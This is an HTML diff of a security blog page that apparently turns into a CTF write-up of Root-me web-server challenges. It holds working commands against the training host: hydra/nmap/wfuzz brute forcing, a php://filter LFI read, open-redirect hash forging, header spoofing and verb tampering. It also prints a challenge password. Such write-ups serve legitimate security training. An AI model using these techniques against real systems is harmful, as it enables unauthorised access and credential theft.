@@ -22,26 +22,27 @@
 
   <!-- Begin Jekyll SEO tag v2.7.1 -->
 <meta name="generator" content="Jekyll v4.2.0" />
-<meta property="og:title" content="Razor-Sec" />
+<meta property="og:title" content="Root-me Webserver" />
 <meta name="author" content="Razor-Sec" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="Some writeup all about cyber security Made by Razor-Sec and i’m : CTF Player , Linux Operation , Ethical Hacking" />
-<meta property="og:description" content="Some writeup all about cyber security Made by Razor-Sec and i’m : CTF Player , Linux Operation , Ethical Hacking" />
-<link rel="canonical" href="/" />
-<meta property="og:url" content="/" />
+<meta name="description" content="HTML - Source code Look at source code &lt;!-- Je crois que c&#39;est vraiment trop simple là ! password : xxx --&gt; HTTP - Open redirect ```# by using hash-identifier tool, I found that the hash algorithm is MD5: Type “help”, “copyright”, “credits” or “license” for more information. import md5 md5.new(‘https://facebook.com’).digest().encode(‘hex’) ‘a023cfbf5f1c39bdf8407f28b60cd134’ md5.new(‘https://mydomain.com’).digest().encode(‘hex’) ‘9af3e23ea90265a580cb11bfce830f97’ Then submit the GET request with my evil domain and related MD5 hash" />
+<meta property="og:description" content="HTML - Source code Look at source code &lt;!-- Je crois que c&#39;est vraiment trop simple là ! password : xxx --&gt; HTTP - Open redirect ```# by using hash-identifier tool, I found that the hash algorithm is MD5: Type “help”, “copyright”, “credits” or “license” for more information. import md5 md5.new(‘https://facebook.com’).digest().encode(‘hex’) ‘a023cfbf5f1c39bdf8407f28b60cd134’ md5.new(‘https://mydomain.com’).digest().encode(‘hex’) ‘9af3e23ea90265a580cb11bfce830f97’ Then submit the GET request with my evil domain and related MD5 hash" />
+<link rel="canonical" href="/posts/writeup-root-me-webserver/" />
+<meta property="og:url" content="/posts/writeup-root-me-webserver/" />
 <meta property="og:site_name" content="Razor-Sec" />
-<link rel="next" href="/page2" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-02-08T00:00:00+07:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="Razor-Sec" />
+<meta property="twitter:title" content="Root-me Webserver" />
 <meta name="twitter:site" content="@0xrxd" />
 <meta name="twitter:creator" content="@Razor-Sec" />
 <meta name="google-site-verification" content="an3WPRVUJk0x4PXH2PRpcD1vt1eBUdQhPLpgsNgamGQ" />
 <script type="application/ld+json">
-{"description":"Some writeup all about cyber security Made by Razor-Sec and i’m : CTF Player , Linux Operation , Ethical Hacking","@type":"WebSite","headline":"Razor-Sec","sameAs":["https://twitter.com/username","https://github.com/username","https://www.linkedin.com/in/afriansyah"],"author":{"@type":"Person","name":"Razor-Sec"},"url":"/","name":"Razor","@context":"https://schema.org"}</script>
+{"description":"HTML - Source code Look at source code &lt;!-- Je crois que c&#39;est vraiment trop simple là ! password : xxx --&gt; HTTP - Open redirect ```# by using hash-identifier tool, I found that the hash algorithm is MD5: Type “help”, “copyright”, “credits” or “license” for more information. import md5 md5.new(‘https://facebook.com’).digest().encode(‘hex’) ‘a023cfbf5f1c39bdf8407f28b60cd134’ md5.new(‘https://mydomain.com’).digest().encode(‘hex’) ‘9af3e23ea90265a580cb11bfce830f97’ Then submit the GET request with my evil domain and related MD5 hash","@type":"BlogPosting","headline":"Root-me Webserver","dateModified":"2021-02-08T00:00:00+07:00","datePublished":"2021-02-08T00:00:00+07:00","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/writeup-root-me-webserver/"},"author":{"@type":"Person","name":"Razor-Sec"},"url":"/posts/writeup-root-me-webserver/","@context":"https://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
 
 
-  <title>Razor-Sec
+  <title>Root-me Webserver | Razor-Sec
   </title>
 
   <!--
@@ -107,6 +108,9 @@
 <link rel="stylesheet" href="/assets/css/style.css">
 
 
+  <link rel="stylesheet"
+    href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">
+
 
 
   <!-- JavaScripts -->
@@ -127,7 +131,7 @@
 
 
 
-<script defer src="/assets/js/dist/home.min.js"></script>
+<script defer src="/assets/js/dist/post.min.js"></script>
 
 
 
@@ -163,7 +167,7 @@
 
   <ul class="w-100">
     <!-- home -->
-    <li class="nav-item active">
+    <li class="nav-item">
       <a href="/" class="nav-link">
         <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
         <span>HOME</span>
@@ -422,8 +426,36 @@
     
 
     
-      <!-- index page -->
-      <span>Posts</span>
+
+      
+
+        
+          
+
+        
+
+      
+
+        
+        <span>
+          
+          
+          <a href="/">
+            Posts
+          </a>
+        </span>
+
+        
+
+      
+
+        
+          <span>Root-me Webserver</span>
+
+        
+
+      
+
     
 
     </span><!-- endof #breadcrumb -->
@@ -431,7 +463,7 @@
     <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>
 
     <div id="topbar-title">
-      Razor-Sec
+      Post
     </div>
 
     <i id="search-trigger" class="fas fa-search fa-fw"></i>
@@ -476,62 +508,17 @@
 
 <!-- return -->
 <div class="row">
-  <div class="col-12 col-lg-11 col-xl-8">
-    <div id="page" class="post pb-5 pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4 mb-md-4">
-    
-      
 
+  <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">
 
+    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
 
-<!-- Get pinned posts -->
+      <h1 data-toc-skip>Root-me Webserver</h1>
 
-
-
-
-
-
-
-<!-- Get default posts -->
-
-
-
-
-
-
-
-
-
-
-
-<div id="post-list">
-
-
-
-  <div class="post-preview">
-    <h1>
-      <a href="/posts/writeup-tryhackme-sustah/">Tryhackme sustah</a>
-    </h1>
-
-    <div class="post-content">
-      <p>
-        
-
-
-
-
-
-        Introduction
-
-This is partical room from tryhackme entitled “sustah” from Tryhackme . Difficulty of This box is Medium and in this box you will learn all about exploiting CMS , Missconfiguration, B...
-      </p>
-    </div>
-
-    <div class="post-meta text-muted d-flex justify-content-between">
-
-      <div>
-        <!-- posted date -->
-        <i class="far fa-calendar fa-fw"></i>
-        <!--
+      <div class="post-meta text-muted d-flex flex-column">
+        <!-- Published date and author -->
+        <div>
+          <!--
   Date format snippet
 -->
 
@@ -543,24 +530,32 @@ This is partical room from tryhackme entitled “sustah” from Tryhackme . Diff
   
     data-toggle="tooltip"
     data-placement="bottom"
-    title="Fri, Mar  5, 2021, 12:00 AM +0700"
+    title="Mon, Feb  8, 2021, 12:00 AM +0700"
   >
 
   
   
 
   
-    Mar  5
+    Feb  8
   
 
-  <i class="unloaded">2021-03-05T00:00:00+07:00</i>
+  <i class="unloaded">2021-02-08T00:00:00+07:00</i>
 
 </span>
 
+          by
+          <span class="author">
+            Razor-Sec
+          </span>
+        </div>
 
-        <!-- time to read -->
-        <i class="far fa-clock fa-fw"></i>
-        <!--
+        <div>
+          <!-- lastmod -->
+          
+
+          <!-- read time -->
+          <!--
   Calculate the post's reading time, and display the word count in tooltip
  -->
 
@@ -574,826 +569,216 @@ This is partical room from tryhackme entitled “sustah” from Tryhackme . Diff
 
 
 <!-- return element -->
-<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="597 words">3 min</span>
+<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="378 words">2 min</span>
 
 
-        <!-- page views -->
+          <!-- page views -->
+          
+
+        </div>
+
+      </div> <!-- .post-meta -->
+
+      <div class="post-content">
+
         
+
+        <h3 id="html---source-code">HTML - Source code</h3>
+<pre><code class="language-#">Look at source code
+&lt;!-- 
+ Je crois que c'est vraiment trop simple là ! 
+password : xxx
+--&gt;
+</code></pre>
+<h3 id="http---open-redirect">HTTP - Open redirect</h3>
+<pre><code class="language-#">by using `hash-identifier` tool, I found that the hash algorithm is MD5:
+Type "help", "copyright", "credits" or "license" for more information.
+&gt;&gt;&gt;
+&gt;&gt;&gt; import md5
+&gt;&gt;&gt; md5.new('https://facebook.com').digest().encode('hex')
+'a023cfbf5f1c39bdf8407f28b60cd134'
+&gt;&gt;&gt;
+&gt;&gt;&gt; md5.new('https://mydomain.com').digest().encode('hex')
+'9af3e23ea90265a580cb11bfce830f97'
+Then submit the GET request with my evil domain and related MD5 hash 
+
+OR 
+
+import hashlib
+kata = input("enter text : ")
+tytd1 = hashlib.md5(kata.encode())
+tytd2 = tytd1.hexdigest()
+print(tytd2)
+</code></pre>
+<h3 id="http---user-agent">HTTP - User-Agent</h3>
+<pre><code class="language-#">curl -A "admin" http://challenge01.root-me.org/web-serveur/ch2/
+&lt;html&gt;&lt;body&gt;&lt;link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /&gt;&lt;iframe id='iframe' src='https://www.root-me.org/?page=externe_header'&gt;&lt;/iframe&gt;&lt;h3&gt;Welcome master!&lt;br/&gt;Password: rr$Li9%L34qd1AAe27&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;
+</code></pre>
+<h3 id="weak-password">Weak Password</h3>
+<pre><code class="language-#">nmap -d -vv -p 80 --script http-brute --script-args http-brute.path=/web-serveur/ch3/ challenge01.root-me.org
+or 
+nmap -d -vv -p 80 --script http-brute --script-args http-brute.path=/web-serveur/ch3/ challenge01.root-me.org
+or
+hydra -L userList.txt -P passwordsList.txt 212.129.38.224 http-head /web-serveur/ch3/
+or
+wfuzz -c -w /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt --basic admin:FUZZ http://challenge01.root-me.org/web-serveur/ch3/
+</code></pre>
+<h3 id="backup-file">Backup File</h3>
+<pre><code class="language-#">nmap -p 80 --script=http-backup-finder --script-args http-backup-finder.url=/web-serveur/ch11/index.php challenge01.root-me.org
+PORT   STATE SERVICE
+80/tcp open  http
+| http-backup-finder:
+| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=challenge01.root-me.org
+|_  http://challenge01.root-me.org:80/web-serveur/ch11/index.php~
+or
+Used OWASP ZAP’s Active Scanner with Backup File Search (included in Active Scanner Rules (beta)). Make sure to use the full path (http://challenge01.root-me.org/web-serveur/ch11/index.php) for the scan and it’ll find the backup "http://challenge01.root-me.org/web-serveur/ch11/index.php~" file, which has a hardcoded password
+
+</code></pre>
+<h3 id="http---directory-indexing">HTTP - Directory indexing</h3>
+<pre><code class="language-#">firs we must check source code and you can see /admin/pass.html
+then open /admin
+and /admin/backup
+
+</code></pre>
+<h3 id="http---headers">HTTP - Headers</h3>
+<pre><code class="language-#">Using CURL:
+
+Request the headers only:
+curl -I http://challenge01.root-me.org/web-serveur/ch5/
+
+Send request with headers:
+curl -H "Header-RootMe-Admin: true" http://challenge01.root-me.org/web-serveur/ch5/
+</code></pre>
+<h3 id="php---filters">PHP - Filters</h3>
+<pre><code class="language-#">We’re going to work at the command line, so let’s define a variable we will use:
+url=http://challenge01.root-me.org//web-serveur/ch12/
+
+We know we are looking for a LFI with php://filter, so let’s try to display the base64 of the file login.php which is use for the authentication(?inc=login.php)
+
+$ curl "${url}?inc=php://filter/read=convert.base64-encode/resource=login.php"
+
+</code></pre>
+<h3 id="http-post">HTTP POST</h3>
+<pre><code class="language-#">first using burp suit and change to this 
+
+POST /web-serveur/ch56/ HTTP/1.1
+Host: challenge01.root-me.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 59
+Origin: http://challenge01.root-me.org
+Connection: close
+Referer: http://challenge01.root-me.org/web-serveur/ch56/
+Upgrade-Insecure-Requests: 1
+
+score=999999999999999999999999999999&amp;generate=Give+a+try%21
+</code></pre>
+<h3 id="http---improper-redirect">HTTP - Improper redirect</h3>
+<pre><code class="language-#">curl -H "HTTP/1.1 200" "http://challenge01.root-me.org/web-serveur/ch32/index.php?redirect"
+</code></pre>
+<h3 id="http---verb-tampering">HTTP - Verb tampering</h3>
+<pre><code class="language-#">Using Burp :
+OPTIONS /web-serveur/ch8/ HTTP/1.1
+Host: challenge01.root-me.org
+User-Agent: Mozilla/5.0 (X11;Linux x86_64; rv:78.0) Gecko/20100101 
+Curl :
+curl http://challenge01.root-me.org/web-serveur/ch8/ -X OPTIONS
+</code></pre>
+
+
       </div>
 
-      
+      <div class="post-tail-wrapper text-muted">
 
-    </div> <!-- .post-meta -->
-
-  </div> <!-- .post-review -->
-
-
-
-  <div class="post-preview">
-    <h1>
-      <a href="/posts/writeup-vulnhub-loly/">Loly Writeup</a>
-    </h1>
-
-    <div class="post-content">
-      <p>
+        <!-- categories -->
+        
+        <div class="post-meta mb-3">
+          <i class="far fa-folder-open fa-fw mr-1"></i>
+          
+            <a href='/categories/writeup/'>Writeup</a>,
+            <a href='/categories/root-me/'>root-me</a>
+        </div>
         
 
+        <!-- tags -->
+        
+        <div class="post-tags">
+          <i class="fa fa-tags fa-fw mr-1"></i>
+          
+          <a href="/tags/web-server/"
+            class="post-tag no-text-decoration" >web-server</a>
+          
+          </div>
+        
 
+        <div class="post-tail-bottom
+          d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
+          
+          <div class="license-wrapper">
+            This post is licensed under
+            <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a>
+            by the author.
+          </div>
+          
 
-
-
-        Introduction
-
-This is partical room from tryhackme entitled “Loly” form vulnhub. Difficulty of This box is easy and in this box you will learn all about exploiting Wordpress , Bruteforce login, Cus...
-      </p>
-    </div>
-
-    <div class="post-meta text-muted d-flex justify-content-between">
-
-      <div>
-        <!-- posted date -->
-        <i class="far fa-calendar fa-fw"></i>
-        <!--
-  Date format snippet
+          <!--
+ Post sharing snippet
 -->
 
+<div class="share-wrapper">
+  <span class="share-label text-muted mr-1">Share</span>
+  <span class="share-icons">
+    
+    
 
-
-
-
-<span class="timeago "
-  
-    data-toggle="tooltip"
-    data-placement="bottom"
-    title="Tue, Mar  2, 2021, 12:00 AM +0700"
-  >
-
-  
-  
-
-  
-    Mar  2
-  
-
-  <i class="unloaded">2021-03-02T00:00:00+07:00</i>
-
-</span>
-
-
-        <!-- time to read -->
-        <i class="far fa-clock fa-fw"></i>
-        <!--
-  Calculate the post's reading time, and display the word count in tooltip
- -->
-
-
-<!-- words per minute  -->
-
-
-
-
-
-
-
-<!-- return element -->
-<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2491 words">13 min</span>
-
-
-        <!-- page views -->
-        
-      </div>
-
+    
       
-
-    </div> <!-- .post-meta -->
-
-  </div> <!-- .post-review -->
-
-
-
-  <div class="post-preview">
-    <h1>
-      <a href="/posts/writeup-tryhackme-CVE-SUDOERS/">Tryhackme LunizzCTF (CVE SUDOERS)</a>
-    </h1>
-
-    <div class="post-content">
-      <p>
-        
-
-
-
-
-
-        Introduction
-This is partical room from tryhackme entitled LunizzCTF with Medium difficulty, but In this Case i want to implement cve sudoers (CVE-2021-3156). In this room we will learn about boot2...
-      </p>
-    </div>
-
-    <div class="post-meta text-muted d-flex justify-content-between">
-
-      <div>
-        <!-- posted date -->
-        <i class="far fa-calendar fa-fw"></i>
-        <!--
-  Date format snippet
--->
-
-
-
-
-
-<span class="timeago "
-  
-    data-toggle="tooltip"
-    data-placement="bottom"
-    title="Mon, Mar  1, 2021, 12:00 AM +0700"
-  >
-
-  
-  
-
-  
-    Mar  1
-  
-
-  <i class="unloaded">2021-03-01T00:00:00+07:00</i>
-
-</span>
-
-
-        <!-- time to read -->
-        <i class="far fa-clock fa-fw"></i>
-        <!--
-  Calculate the post's reading time, and display the word count in tooltip
- -->
-
-
-<!-- words per minute  -->
-
-
-
-
-
-
-
-<!-- return element -->
-<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="665 words">3 min</span>
-
-
-        <!-- page views -->
-        
-      </div>
-
+        <a href="https://twitter.com/intent/tweet?text=Root-me Webserver - Razor-Sec&url=/posts/writeup-root-me-webserver/" data-toggle="tooltip" data-placement="top"
+          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
+          <i class="fa-fw fab fa-twitter"></i>
+        </a>
+    
       
-
-    </div> <!-- .post-meta -->
-
-  </div> <!-- .post-review -->
-
-
-
-  <div class="post-preview">
-    <h1>
-      <a href="/posts/writeup-vulnhub-pwned1/">Pwned1 Writeup</a>
-    </h1>
-
-    <div class="post-content">
-      <p>
-        
-
-
-
-
-
-        Introduction
-This is partical room from tryhackme entitled “Pwned1” form vulnhub. Difficulty of This box is Intermediate and in this box you will learn all about Fuzzing diretory, Custom exploitati...
-      </p>
-    </div>
-
-    <div class="post-meta text-muted d-flex justify-content-between">
-
-      <div>
-        <!-- posted date -->
-        <i class="far fa-calendar fa-fw"></i>
-        <!--
-  Date format snippet
--->
-
-
-
-
-
-<span class="timeago "
-  
-    data-toggle="tooltip"
-    data-placement="bottom"
-    title="Sun, Feb 28, 2021, 12:00 AM +0700"
-  >
-
-  
-  
-
-  
-    Feb 28
-  
-
-  <i class="unloaded">2021-02-28T00:00:00+07:00</i>
-
-</span>
-
-
-        <!-- time to read -->
-        <i class="far fa-clock fa-fw"></i>
-        <!--
-  Calculate the post's reading time, and display the word count in tooltip
- -->
-
-
-<!-- words per minute  -->
-
-
-
-
-
-
-
-<!-- return element -->
-<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="690 words">3 min</span>
-
-
-        <!-- page views -->
-        
-      </div>
-
+        <a href="https://www.facebook.com/sharer/sharer.php?title=Root-me Webserver - Razor-Sec&u=/posts/writeup-root-me-webserver/" data-toggle="tooltip" data-placement="top"
+          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
+          <i class="fa-fw fab fa-facebook-square"></i>
+        </a>
+    
       
-
-    </div> <!-- .post-meta -->
-
-  </div> <!-- .post-review -->
-
-
-
-  <div class="post-preview">
-    <h1>
-      <a href="/posts/writeup-tryhackme-magician/">Tryhackme Magician</a>
-    </h1>
-
-    <div class="post-content">
-      <p>
-        
-
-
-
-
-
-        Introduction
-This is partical room from tryhackme entitled “Magician” with Easy difficulty. In this room we will learn about Exploitation RCE with multiple vulnerabilities in ImageMagick from CVE-2...
-      </p>
-    </div>
-
-    <div class="post-meta text-muted d-flex justify-content-between">
-
-      <div>
-        <!-- posted date -->
-        <i class="far fa-calendar fa-fw"></i>
-        <!--
-  Date format snippet
--->
-
-
-
-
-
-<span class="timeago "
-  
-    data-toggle="tooltip"
-    data-placement="bottom"
-    title="Tue, Feb 23, 2021, 12:00 AM +0700"
-  >
-
-  
-  
-
-  
-    Feb 23
-  
-
-  <i class="unloaded">2021-02-23T00:00:00+07:00</i>
-
-</span>
-
-
-        <!-- time to read -->
-        <i class="far fa-clock fa-fw"></i>
-        <!--
-  Calculate the post's reading time, and display the word count in tooltip
- -->
-
-
-<!-- words per minute  -->
-
-
-
-
-
-
-
-<!-- return element -->
-<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="544 words">3 min</span>
-
-
-        <!-- page views -->
-        
-      </div>
-
+        <a href="https://telegram.me/share?text=Root-me Webserver - Razor-Sec&url=/posts/writeup-root-me-webserver/" data-toggle="tooltip" data-placement="top"
+          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
+          <i class="fa-fw fab fa-telegram"></i>
+        </a>
+    
       
-
-    </div> <!-- .post-meta -->
-
-  </div> <!-- .post-review -->
-
-
-
-  <div class="post-preview">
-    <h1>
-      <a href="/posts/writeup-tryhackme-watcher/">Tryhackme Watcher</a>
-    </h1>
-
-    <div class="post-content">
-      <p>
-        
-
-
-
-
-
-        Introduction
-This is partical room from tryhackme entitled “Watcher” with Medium difficulty. In this room we will learn about File Inclusion, LFI to RCE, Getting privilage from cronjob, and Python ...
-      </p>
-    </div>
-
-    <div class="post-meta text-muted d-flex justify-content-between">
-
-      <div>
-        <!-- posted date -->
-        <i class="far fa-calendar fa-fw"></i>
-        <!--
-  Date format snippet
--->
-
-
-
-
-
-<span class="timeago "
-  
-    data-toggle="tooltip"
-    data-placement="bottom"
-    title="Sat, Feb 20, 2021, 12:00 AM +0700"
-  >
-
-  
-  
-
-  
-    Feb 20
-  
-
-  <i class="unloaded">2021-02-20T00:00:00+07:00</i>
-
-</span>
-
-
-        <!-- time to read -->
-        <i class="far fa-clock fa-fw"></i>
-        <!--
-  Calculate the post's reading time, and display the word count in tooltip
- -->
-
-
-<!-- words per minute  -->
-
-
-
-
-
-
-
-<!-- return element -->
-<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1407 words">7 min</span>
-
-
-        <!-- page views -->
-        
-      </div>
-
-      
-
-    </div> <!-- .post-meta -->
-
-  </div> <!-- .post-review -->
-
-
-
-  <div class="post-preview">
-    <h1>
-      <a href="/posts/writeup-tryhackme-The-Great-Escape/">Tryhackme The Great Escape</a>
-    </h1>
-
-    <div class="post-content">
-      <p>
-        
-
-
-
-
-
-        Introduction
-This is partical room from tryhackme entitled “The Great Escape” with Medium difficulty. In this room we will learn about SSRF along with code injection, Port Knocking, Enumeration of ...
-      </p>
-    </div>
-
-    <div class="post-meta text-muted d-flex justify-content-between">
-
-      <div>
-        <!-- posted date -->
-        <i class="far fa-calendar fa-fw"></i>
-        <!--
-  Date format snippet
--->
-
-
-
-
-
-<span class="timeago "
-  
-    data-toggle="tooltip"
-    data-placement="bottom"
-    title="Fri, Feb 19, 2021, 12:00 AM +0700"
-  >
-
-  
-  
-
-  
-    Feb 19
-  
-
-  <i class="unloaded">2021-02-19T00:00:00+07:00</i>
-
-</span>
-
-
-        <!-- time to read -->
-        <i class="far fa-clock fa-fw"></i>
-        <!--
-  Calculate the post's reading time, and display the word count in tooltip
- -->
-
-
-<!-- words per minute  -->
-
-
-
-
-
-
-
-<!-- return element -->
-<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1628 words">9 min</span>
-
-
-        <!-- page views -->
-        
-      </div>
-
-      
-
-    </div> <!-- .post-meta -->
-
-  </div> <!-- .post-review -->
-
-
-
-  <div class="post-preview">
-    <h1>
-      <a href="/posts/writeup-tryhackme-inferno/">Tryhackme Inferno</a>
-    </h1>
-
-    <div class="post-content">
-      <p>
-        
-
-
-
-
-
-        Introduction
-This is partical room from Tryhackme entitled Inferno with Medium difficulty. In this room we will learn about exploit HTTP basic auth and IDE Exploit and Linux Privilage escalation . ...
-      </p>
-    </div>
-
-    <div class="post-meta text-muted d-flex justify-content-between">
-
-      <div>
-        <!-- posted date -->
-        <i class="far fa-calendar fa-fw"></i>
-        <!--
-  Date format snippet
--->
-
-
-
-
-
-<span class="timeago "
-  
-    data-toggle="tooltip"
-    data-placement="bottom"
-    title="Tue, Feb 16, 2021, 12:00 AM +0700"
-  >
-
-  
-  
-
-  
-    Feb 16
-  
-
-  <i class="unloaded">2021-02-16T00:00:00+07:00</i>
-
-</span>
-
-
-        <!-- time to read -->
-        <i class="far fa-clock fa-fw"></i>
-        <!--
-  Calculate the post's reading time, and display the word count in tooltip
- -->
-
-
-<!-- words per minute  -->
-
-
-
-
-
-
-
-<!-- return element -->
-<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="544 words">3 min</span>
-
-
-        <!-- page views -->
-        
-      </div>
-
-      
-
-    </div> <!-- .post-meta -->
-
-  </div> <!-- .post-review -->
-
-
-
-  <div class="post-preview">
-    <h1>
-      <a href="/posts/writeup-hackthebox-jewel/">Hackthebox Jewel</a>
-    </h1>
-
-    <div class="post-content">
-      <p>
-        
-
-
-
-
-
-        Introduction
-This is partical room from hackthebox entitled jewel with Medium difficulty. In this room we will learn about code analysis of a Ruby on Rails web application . This reveals an unsafe ...
-      </p>
-    </div>
-
-    <div class="post-meta text-muted d-flex justify-content-between">
-
-      <div>
-        <!-- posted date -->
-        <i class="far fa-calendar fa-fw"></i>
-        <!--
-  Date format snippet
--->
-
-
-
-
-
-<span class="timeago "
-  
-    data-toggle="tooltip"
-    data-placement="bottom"
-    title="Mon, Feb 15, 2021, 12:00 AM +0700"
-  >
-
-  
-  
-
-  
-    Feb 15
-  
-
-  <i class="unloaded">2021-02-15T00:00:00+07:00</i>
-
-</span>
-
-
-        <!-- time to read -->
-        <i class="far fa-clock fa-fw"></i>
-        <!--
-  Calculate the post's reading time, and display the word count in tooltip
- -->
-
-
-<!-- words per minute  -->
-
-
-
-
-
-
-
-<!-- return element -->
-<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1073 words">5 min</span>
-
-
-        <!-- page views -->
-        
-      </div>
-
-      
-
-    </div> <!-- .post-meta -->
-
-  </div> <!-- .post-review -->
-
-
-
-  <div class="post-preview">
-    <h1>
-      <a href="/posts/writeup-tryhackme-en-pass/">Tryhackme En-pass</a>
-    </h1>
-
-    <div class="post-content">
-      <p>
-        
-
-
-
-
-
-        Introduction
-This is partical room from tryhackme entitled En-pass with Medium difficulty. In this room we will learn about web exploitation and privilage escalation . room link here
-
-Enumeration
-
-...
-      </p>
-    </div>
-
-    <div class="post-meta text-muted d-flex justify-content-between">
-
-      <div>
-        <!-- posted date -->
-        <i class="far fa-calendar fa-fw"></i>
-        <!--
-  Date format snippet
--->
-
-
-
-
-
-<span class="timeago "
-  
-    data-toggle="tooltip"
-    data-placement="bottom"
-    title="Sun, Feb 14, 2021, 12:00 AM +0700"
-  >
-
-  
-  
-
-  
-    Feb 14
-  
-
-  <i class="unloaded">2021-02-14T00:00:00+07:00</i>
-
-</span>
-
-
-        <!-- time to read -->
-        <i class="far fa-clock fa-fw"></i>
-        <!--
-  Calculate the post's reading time, and display the word count in tooltip
- -->
-
-
-<!-- words per minute  -->
-
-
-
-
-
-
-
-<!-- return element -->
-<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1524 words">8 min</span>
-
-
-        <!-- page views -->
-        
-      </div>
-
-      
-
-    </div> <!-- .post-meta -->
-
-  </div> <!-- .post-review -->
-
-
-
-</div> <!-- #post-list -->
-
-
-  <!--
-  The paginator for post list on HomgPage.
--->
-
-<ul class="pagination mt-4 mb-0 pl-lg-2">
-  <!-- left arrow -->
-  
-  <li class="page-item disabled">
-    <a class="page-link btn-box-shadow" href="#" aria-label="previous-page">
-      <i class="fas fa-angle-left"></i>
-    </a>
-  </li>
-
-  <!-- page numbers -->
-  
-  
-
-  
-
-    
-    
-    
-    
+        <a href="https://www.linkedin.com/sharing/share-offsite/?url=/posts/writeup-root-me-webserver/" data-toggle="tooltip" data-placement="top"
+          title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin">
+          <i class="fa-fw fab fa-linkedin"></i>
+        </a>
     
 
-    
+    <i class="fa-fw fas fa-link small" onclick="copyLink()"
+        data-toggle="tooltip" data-placement="top" title="Copy link"></i>
 
-    
-      <!-- show number -->
-      <li class="page-item  active">
-        <a class="page-link btn-box-shadow" href="/">1</a>
-      </li>
-    
+  </span>
+</div>
 
-  
 
-    
-    
-    
-    
-    
+        </div><!-- .post-tail-bottom -->
 
-    
+      </div><!-- div.post-tail -->
 
-    
-      <!-- show number -->
-      <li class="page-item ">
-        <a class="page-link btn-box-shadow" href="/page2/">2</a>
-      </li>
-    
+    </div> <!-- .post -->
+
+
+  </div> <!-- #post-wrapper -->
 
   
 
-  <!-- right arrow -->
   
-  <li class="page-item ">
-    <a class="page-link btn-box-shadow" href="/page2" aria-label="next-page">
-      <i class="fas fa-angle-right"></i>
-    </a>
-  </li>
-
-</ul> <!-- .pagination -->
-
-
-
-    
-    </div> <!-- #page -->
-  </div><!-- .col-12 -->
 
   <!--
   The Pannel on right side (Desktop views)
@@ -1966,13 +1351,470 @@ Enumeration
   </div> <!-- .access -->
 
   
+    <!-- BS-toc.js will be loaded at medium priority -->
+    <script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>
+    <div id="toc-wrapper" class="pl-0 pr-4 mb-5">
+      <span class="pl-3 pt-2 mb-2">Contents</span>
+      <nav id="toc" data-toggle="toc"></nav>
+    </div>
+  
 
 </div> <!-- #panel-wrapper -->
 
 
+</div> <!-- .row -->
+
+<div class="row">
+  <div class="col-12 col-lg-11 col-xl-8">
+    <div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
+
+    <!--
+ Recommend the other 3 posts according to the tags and categories of the current post,
+ if the number is not enough, use the other latest posts to supplement.
+-->
+
+<!-- The total size of related posts  -->
+
+
+<!-- An random integer that bigger than 0  -->
+
+
+<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+
+
+<!-- Fill with the other newlest posts  -->
+
+
+
+
+
